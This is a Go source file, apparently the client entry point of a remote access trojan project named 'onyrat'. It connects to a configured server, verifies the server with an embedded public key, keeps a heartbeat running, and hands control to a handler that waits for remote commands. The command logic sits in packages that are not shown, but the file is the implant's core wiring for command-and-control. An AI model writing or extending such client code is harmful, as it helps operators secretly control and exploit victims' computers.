//go:build client
// +build client

package main

import (
	"context"
	"net"

	"github.com/Onyz107/onyrat/internal/config"
	"github.com/Onyz107/onyrat/internal/logger"
	"github.com/Onyz107/onyrat/pkg/auth"
	"github.com/Onyz107/onyrat/pkg/commands"
	"github.com/Onyz107/onyrat/pkg/network"
	"github.com/sirupsen/logrus"
)

func main() {
	logger.Log.SetLevel(logrus.DebugLevel)

	ctx, cancel := context.WithCancelCause(context.Background())
	defer cancel(nil)

	client, err := network.NewClient(net.JoinHostPort(config.ClientConfigs.Host, config.ClientConfigs.Port), ctx)
	if err != nil {
		cancel(err)
		logger.Log.Error(err)
		return
	}
	defer client.Disconnect()

	logger.Log.Infof("Connected to server on: %s", net.JoinHostPort(config.ClientConfigs.Host, config.ClientConfigs.Port))

	err = auth.ServerAuthorization(client, client.Manager, config.ClientConfigs.PublicKey)
	if err != nil {
		cancel(err)
		logger.Log.Error(err)
		return
	}
	logger.Log.Info("Authorization successful")

	heartbeatManager := network.HeartbeatManager{
		Communicator: client,
		Manager:      client.Manager,
		Ctx:          ctx,
	}

	heartbeatManager.Start()
	defer heartbeatManager.Stop()
	go func() {
		if err := heartbeatManager.Wait(); err != nil {
			cancel(err)
			logger.Log.Error(err)
		}
	}()

	commandHandler := commands.CommandHandler{
		Communicator: client,
		Ctx:          ctx,
	}

	commandHandler.StartClient()
	defer commandHandler.StopClient()

	if err := commandHandler.WaitClient(); err != nil {
		cancel(err)
		logger.Log.Error(err)
	}
}
